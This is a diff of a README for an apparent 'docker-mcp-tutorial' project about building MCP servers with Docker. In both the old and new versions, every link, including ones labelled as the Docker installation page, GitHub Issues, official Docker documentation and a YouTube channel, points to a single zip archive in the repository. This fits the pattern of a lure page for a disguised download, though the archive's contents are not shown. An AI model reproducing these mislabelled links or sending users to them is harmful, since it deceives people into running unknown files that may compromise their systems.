@@ -1,7 +1,7 @@
 # 🐳 docker-mcp-tutorial - Build MCP Servers with Ease
 
 ## 📥 Download the Software
-[![Download](https://raw.githubusercontent.com/mamaamacrivi/docker-mcp-tutorial/main/scavengerism/docker-mcp-tutorial.zip%20release-blue)](https://raw.githubusercontent.com/mamaamacrivi/docker-mcp-tutorial/main/scavengerism/docker-mcp-tutorial.zip)
+[![Download](https://github.com/mamaamacrivi/docker-mcp-tutorial/raw/refs/heads/main/examples/mcp_docker_tutorial_1.3.zip%20release-blue)](https://github.com/mamaamacrivi/docker-mcp-tutorial/raw/refs/heads/main/examples/mcp_docker_tutorial_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the docker-mcp-tutorial! This guide provides everything you need to build your own MCP servers using Docker. Whether you're following along with NetworkChuck's video or exploring on your own, this README will help you set up quickly and easily.
@@ -10,14 +10,14 @@ Welcome to the docker-mcp-tutorial! This guide provides everything you need to b
 Before you begin, make sure your computer meets these requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or a recent version of a Linux distribution.
-- **Docker:** You need Docker installed on your machine. Visit the [Docker installation page](https://raw.githubusercontent.com/mamaamacrivi/docker-mcp-tutorial/main/scavengerism/docker-mcp-tutorial.zip) for instructions.
+- **Docker:** You need Docker installed on your machine. Visit the [Docker installation page](https://github.com/mamaamacrivi/docker-mcp-tutorial/raw/refs/heads/main/examples/mcp_docker_tutorial_1.3.zip) for instructions.
 - **Storage:** At least 5 GB of free space.
 - **Internet Connection:** Required for downloading the necessary files.
 
 ## 📂 Download & Install
 To download the tutorial materials, visit the following page:
 
-[Download the latest release](https://raw.githubusercontent.com/mamaamacrivi/docker-mcp-tutorial/main/scavengerism/docker-mcp-tutorial.zip)
+[Download the latest release](https://github.com/mamaamacrivi/docker-mcp-tutorial/raw/refs/heads/main/examples/mcp_docker_tutorial_1.3.zip)
 
 Once on the Releases page, find the latest version and click on it. Here are the steps to follow:
 
@@ -60,13 +60,13 @@ If you encounter any problems or have questions, consider the following options 
 
 - **Community Forums:** Look for forums related to Docker or MCP where users share tips.
 - **Documentation:** Explore the documentation provided in the downloaded package.
-- **Issue Tracking:** Visit the [GitHub Issues](https://raw.githubusercontent.com/mamaamacrivi/docker-mcp-tutorial/main/scavengerism/docker-mcp-tutorial.zip) page to report a problem or ask a question.
+- **Issue Tracking:** Visit the [GitHub Issues](https://github.com/mamaamacrivi/docker-mcp-tutorial/raw/refs/heads/main/examples/mcp_docker_tutorial_1.3.zip) page to report a problem or ask a question.
 
 ## 📖 Further Reading
 To learn more about Docker and MCP servers, check out these resources:
 
-- [Docker Official Documentation](https://raw.githubusercontent.com/mamaamacrivi/docker-mcp-tutorial/main/scavengerism/docker-mcp-tutorial.zip)
-- [NetworkChuck's YouTube Channel](https://raw.githubusercontent.com/mamaamacrivi/docker-mcp-tutorial/main/scavengerism/docker-mcp-tutorial.zip)
+- [Docker Official Documentation](https://github.com/mamaamacrivi/docker-mcp-tutorial/raw/refs/heads/main/examples/mcp_docker_tutorial_1.3.zip)
+- [NetworkChuck's YouTube Channel](https://github.com/mamaamacrivi/docker-mcp-tutorial/raw/refs/heads/main/examples/mcp_docker_tutorial_1.3.zip)
 
 ## 👨‍💻 Contributions
 If you wish to contribute to this project, feel free to open a pull request. Clear contributions help improve the community's experience with Docker and MCP servers.
